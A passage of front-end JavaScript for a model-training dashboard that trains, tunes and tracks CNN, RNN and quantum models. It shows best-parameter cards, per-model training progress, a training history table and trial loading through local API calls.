    { key: "rnn",     label: "RNN",     icon: "🔄" },
    { key: "quantum", label: "Quantum", icon: "⚛️" },
  ];
  grid.innerHTML = defs.map(({ key, label, icon }) => {
    const b = best[key];
    if (!b) return "";
    const chips = Object.entries(b)
      .filter(([k]) => !["val_acc", "train_acc", "gap", "overfit"].includes(k))
      .map(([k, v]) => `<span class="tune-param-chip">${k}=${v}</span>`)
      .join("");
    const savedBadge = saved
      ? `<span class="tune-saved-badge">💾 Checkpoint kaydedildi</span>`
      : "";
    return `<div class="tune-best-card">
      <div class="tune-best-card-title">${icon} ${label} ${savedBadge}</div>
      <div class="tune-best-card-acc">${b.val_acc}%</div>
      <div class="tune-best-params">${chips}</div>
    </div>`;
  }).join("");

  // Hide apply button if already auto-saved, show confirmation instead
  const applyBtn = document.querySelector("#tune-best-wrap .btn-primary");
  const applyMsg = document.getElementById("tune-apply-msg");
  if (saved && applyBtn) {
    applyBtn.style.display = "none";
    if (applyMsg) {
      applyMsg.style.color = "var(--green)";
      applyMsg.textContent = "✓ Best parameters applied and models saved";
    }
  }
}

async function applyBestTuneParams() {
  const msg = document.getElementById("tune-apply-msg");
  if (msg) { msg.style.color = "var(--text2)"; msg.textContent = "Applying…"; }
  try {
    const r = await fetch("/api/tune/apply", { method: "POST" });
    const d = await r.json();
    if (d.ok) {
      if (msg) { msg.style.color = "var(--green)"; msg.textContent = "✓ " + d.message; }
      _archConfigLoaded = false;
      await loadArchConfig();
      setTimeout(() => { if (msg) msg.textContent = ""; }, 5000);
    } else {
      if (msg) { msg.style.color = "var(--red)"; msg.textContent = "✗ " + (d.error || "Error"); }
    }
  } catch(e) {
    if (msg) { msg.style.color = "var(--red)"; msg.textContent = "✗ Connection error"; }
  }
}

// ───────────────────────────────────────────
// Per-model individual training
// ───────────────────────────────────────────
let _modelTrainPollTimer = null;

async function trainSingleModel(modelKey) {
  const btn = document.getElementById(`btn-train-${modelKey}`);
  const progDiv = document.getElementById(`model-train-progress-${modelKey}`);

  if (btn) { btn.disabled = true; btn.textContent = "⏳ Training…"; }
  if (progDiv) { progDiv.style.display = "flex"; }
  // Hide previous val metrics while retraining
  const mEl = document.getElementById(`model-val-metrics-${modelKey}`);
  if (mEl) mEl.style.display = "none";
  _setModelTrainBar(modelKey, 5, `${modelKey.toUpperCase()} starting…`);

  try {
    const r = await fetch(`/api/train/${modelKey}`, { method: "POST" });
    const d = await r.json();
    if (!r.ok || d.error) {
      _setModelTrainBar(modelKey, 0, `✗ ${d.error || "Error"}`);
      if (btn) { btn.disabled = false; btn.textContent = `▶ Train ${modelKey.toUpperCase()} Only`; }
      return;
    }
    _startModelTrainPoll();
  } catch(e) {
    _setModelTrainBar(modelKey, 0, "✗ Connection error");
    if (btn) { btn.disabled = false; btn.textContent = `▶ Train ${modelKey.toUpperCase()} Only`; }
  }
}

function _setModelTrainBar(modelKey, pct, msg) {
  const bar = document.getElementById(`model-train-bar-${modelKey}`);
  const txt = document.getElementById(`model-train-msg-${modelKey}`);
  if (bar) bar.style.width = `${pct}%`;
  if (txt) txt.textContent = msg || "";
}

function _startModelTrainPoll() {
  if (_modelTrainPollTimer) return;
  _modelTrainPollTimer = setInterval(_pollModelTrainStatus, 1500);
}

async function _pollModelTrainStatus() {
  try {
    const r = await fetch("/api/train/status");
    if (!r.ok) return;
    const statuses = await r.json();
    let anyRunning = false;

    for (const [key, s] of Object.entries(statuses)) {
      const progDiv = document.getElementById(`model-train-progress-${key}`);
      const btn     = document.getElementById(`btn-train-${key}`);

      if (s.running) {
        anyRunning = true;
        if (progDiv) progDiv.style.display = "flex";
        _setModelTrainBar(key, s.progress, s.message);
        if (btn) { btn.disabled = true; btn.textContent = "⏳ Training…"; }
      } else if (s.done) {
        if (progDiv) progDiv.style.display = "flex";
        _setModelTrainBar(key, 100, s.message);
        if (btn) {
          btn.disabled = false;
          const label = key === "cnn" ? "CNN" : key === "rnn" ? "RNN" : "Quantum";
          btn.textContent = `▶ Train ${label} Only`;
        }
        // Show validation metrics
        if (s.val_acc !== null && s.val_acc !== undefined) {
          const metricsEl = document.getElementById(`model-val-metrics-${key}`);
          if (metricsEl) {
            metricsEl.style.display = "flex";
            const accPct = (s.val_acc * 100).toFixed(1);
            const accEl  = document.getElementById(`val-acc-${key}`);
            const lossEl = document.getElementById(`val-loss-${key}`);
            const splitEl = document.getElementById(`val-split-${key}`);
            if (accEl) {
              accEl.textContent = `${accPct}%`;
              accEl.className = `val-metric-value${s.val_acc >= 0.65 ? "" : " val-metric-warn"}`;
            }
            if (lossEl) lossEl.textContent = s.val_loss != null ? s.val_loss.toFixed(4) : "—";
            if (splitEl) splitEl.textContent = `${s.n_train} / ${s.n_val}`;
          }
        }
      } else if (s.error) {
        if (progDiv) progDiv.style.display = "flex";
        _setModelTrainBar(key, 0, s.message);
        if (btn) {
          btn.disabled = false;
          const label = key === "cnn" ? "CNN" : key === "rnn" ? "RNN" : "Quantum";
          btn.textContent = `▶ Train ${label} Only`;
        }
      }
    }

    if (!anyRunning) {
      clearInterval(_modelTrainPollTimer);
      _modelTrainPollTimer = null;
    }
  } catch(e) {
    // silent
  }
}

// ───────────────────────────────────────────
// Utility
// ───────────────────────────────────────────
function setEl(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = val;
}

// ═══════════════════════════════════════════
// Training History — Results Tab
// ═══════════════════════════════════════════
let _resultsData   = [];
let _resultsFilter = "all";

async function resetTrainingHistory() {
  if (!confirm("All training records will be permanently deleted. Are you sure?")) return;
  try {
    const r = await fetch("/api/training-history/reset", { method: "POST" });
    const d = await r.json();
    if (d.success) {
      _resultsData = [];
      _renderResultsSummary([]);
      _renderResultsTable([], _resultsFilter);
      const cnt = document.getElementById("results-count");
      if (cnt) cnt.textContent = "";
    } else {
      alert("Reset error: " + (d.error || "Unknown error"));
    }
  } catch(e) {
    alert("Connection error: " + e.message);
  }
}

async function loadTrainingHistory() {
  try {
    const r = await fetch("/api/training-history");
    if (!r.ok) return;
    _resultsData = await r.json();
    _renderResultsSummary(_resultsData);
    _renderResultsTable(_resultsData, _resultsFilter);
  } catch(e) { /* silent */ }
}

function filterResults(f) {
  _resultsFilter = f;
  document.querySelectorAll(".results-filter-btn").forEach(b => b.classList.remove("active"));
  const keys = ["all","manual","tuning_trial","tuning_final"];
  const btns = document.querySelectorAll(".results-filter-btn");
  const idx  = keys.indexOf(f);
  if (btns[idx]) btns[idx].classList.add("active");
  _renderResultsTable(_resultsData, f);
}

function _renderResultsSummary(data) {
  const grid = document.getElementById("results-best-grid");
  if (!grid) return;

  const best = {};
  for (const row of data) {
    if (row.val_acc === null || row.val_acc === undefined) continue;
    const m = row.model;
    if (!best[m] || row.val_acc > best[m].val_acc) best[m] = row;
  }

  const defs = [
    { key: "cnn",     label: "CNN",     icon: "📊" },
    { key: "rnn",     label: "RNN",     icon: "🔄" },
    { key: "quantum", label: "Quantum", icon: "⚛" },
  ];

  const srcLabel = { manual: "Manual", tuning_trial: "Tuning Trial", tuning_final: "Tuning Final" };

  grid.innerHTML = defs.map(({ key, label, icon }) => {
    const b = best[key];
    if (!b) return `<div class="results-best-card results-best-empty">
      <div class="results-best-title">${icon} ${label}</div>
      <div class="results-best-nodata">No records yet</div>
    </div>`;

    const accPct   = (b.val_acc * 100).toFixed(1);
    const accClass = b.val_acc >= 0.85 ? "res-acc-high" : b.val_acc >= 0.65 ? "res-acc-mid" : "res-acc-low";
    const src      = srcLabel[b.source] || b.source;
    const cfg      = b.config && typeof b.config === "object"
                     ? Object.entries(b.config).map(([k,v]) => `${k}=${v}`).join(" · ")
                     : "";
    const time     = b.timestamp ? b.timestamp.slice(0,16).replace("T"," ") : "";

    return `<div class="results-best-card">
      <div class="results-best-title">${icon} ${label}</div>
      <div class="results-best-acc ${accClass}">${accPct}%</div>
      <div class="results-best-meta">
        <span class="results-src-badge results-src-${b.source}">${src}</span>
        <span class="results-best-time">${time}</span>
      </div>
      ${cfg ? `<div class="results-best-config">${cfg}</div>` : ""}
    </div>`;
  }).join("");
}

function _renderResultsTable(data, filter) {
  const tbody = document.getElementById("results-tbody");
  const empty = document.getElementById("results-empty");
  const count = document.getElementById("results-count");
  if (!tbody) return;

  const rows = filter === "all" ? data : data.filter(r => r.source === filter);

  if (count) count.textContent = `${rows.length} records`;

  if (rows.length === 0) {
    tbody.innerHTML = "";
    if (empty) empty.style.display = "block";
    return;
  }
  if (empty) empty.style.display = "none";

  const srcLabel = { manual: "Manual", tuning_trial: "Tuning Trial", tuning_final: "Tuning Final" };

  tbody.innerHTML = rows.map(r => {
    const acc      = r.val_acc != null ? (r.val_acc * 100).toFixed(1) + "%" : "—";
    const accClass = r.val_acc != null
                     ? (r.val_acc >= 0.85 ? "res-acc-high" : r.val_acc >= 0.65 ? "res-acc-mid" : "res-acc-low")
                     : "";
    const loss  = r.val_loss != null ? Number(r.val_loss).toFixed(4) : "—";
    const split = r.n_val > 0 ? `${r.n_train} / ${r.n_val}` : (r.n_train > 0 ? `${r.n_train} / —` : "—");
    const time  = r.timestamp ? r.timestamp.slice(0,16).replace("T"," ") : "—";

    let cfgHtml = "";
    if (r.config && typeof r.config === "object") {
      const chips = Object.entries(r.config).slice(0,4)
        .map(([k,v]) => `<span class="tune-param-chip">${k}=${v}</span>`).join("");
      cfgHtml = `<div style="margin-top:3px">${chips}</div>`;
    }
    const lbl = r.label || "—";

    // "Load" button for tuning rows that have a config
    let actionCell = '<td></td>';
    if ((r.source === "tuning_trial" || r.source === "tuning_final") &&
         r.config && typeof r.config === "object" && r.model) {
      const paramsEsc = encodeURIComponent(JSON.stringify(r.config));
      const labelEsc  = encodeURIComponent(lbl);
      const epochs    = r.source === "tuning_final" ? (r.epochs || 50) : 50;
      actionCell = `<td><button class="tune-load-btn" onclick="loadTuningTrial('${(r.model||"").toLowerCase()}',decodeURIComponent('${paramsEsc}'),'${labelEsc}',${epochs})">▶ Load</button></td>`;
    }

    return `<tr>
      <td class="res-id">${r.id}</td>
      <td class="res-time">${time}</td>
      <td><span class="results-src-badge results-src-${r.source}">${srcLabel[r.source] || r.source}</span></td>
      <td><span class="tune-model-badge tune-model-${(r.model||"").toLowerCase()}">${(r.model||"").toUpperCase()}</span></td>
      <td class="res-label">${lbl}${cfgHtml}</td>
      <td><span class="${accClass}" style="font-weight:600">${acc}</span></td>
      <td class="res-num">${loss}</td>
      <td class="res-num">${split}</td>
      <td class="res-num">${r.epochs || "—"}</td>
      ${actionCell}
    </tr>`;
  }).join("");
}

// ═══════════════════════════════════════════
// Trial Model Selection & Loading
// ═══════════════════════════════════════════
let _trialLoadPollTimer = null;

async function loadTuningTrial(model, paramsJson, labelEnc, epochs) {
  let params;
  try { params = JSON.parse(paramsJson); } catch { params = {}; }
  const label = decodeURIComponent(labelEnc);

  // Show load status panel in tune card
  const wrap = document.getElementById("tune-load-wrap");
  const bar  = document.getElementById("tune-load-bar");
  const msg  = document.getElementById("tune-load-msg");
  if (wrap) wrap.style.display = "block";
  if (bar)  { bar.style.width = "5%"; bar.classList.remove("train-bar-success"); }
  if (msg)  msg.textContent = `${model.toUpperCase()} — "${label}" loading with full training…`;

  // Scroll load panel into view
  wrap?.scrollIntoView({ behavior: "smooth", block: "nearest" });

  try {
    const r = await fetch("/api/tune/load-trial", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ model, config: params, epochs }),
    });
    const d = await r.json();
    if (!r.ok || d.error) {
      if (msg) msg.textContent = `✗ ${d.error || "Error"}`;
      return;
    }
    _startTrialLoadPoll();
  } catch(e) {
    if (msg) msg.textContent = "✗ Connection error";
  }
}

function _startTrialLoadPoll() {
  if (_trialLoadPollTimer) return;
  _trialLoadPollTimer = setInterval(_pollTrialLoad, 1500);
}

async function _pollTrialLoad() {
  try {
    const r = await fetch("/api/tune/load-trial-status");
    if (!r.ok) return;
    const s = await r.json();
    const bar = document.getElementById("tune-load-bar");
    const msg = document.getElementById("tune-load-msg");
    if (bar) bar.style.width = `${s.progress}%`;
    if (msg) msg.textContent = s.message || "";

    if (!s.running) {
      clearInterval(_trialLoadPollTimer);
      _trialLoadPollTimer = null;
      if (s.done) {
        if (bar) bar.classList.add("train-bar-success");
        // Reload arch config to reflect new params
        _archConfigLoaded = false;
        await loadArchConfig();
        // Also refresh results table if on that tab
        if (document.getElementById("tab-results")?.classList.contains("active")) {
          await loadTrainingHistory();
        }
      }
    }
  } catch(e) { /* silent */ }
}
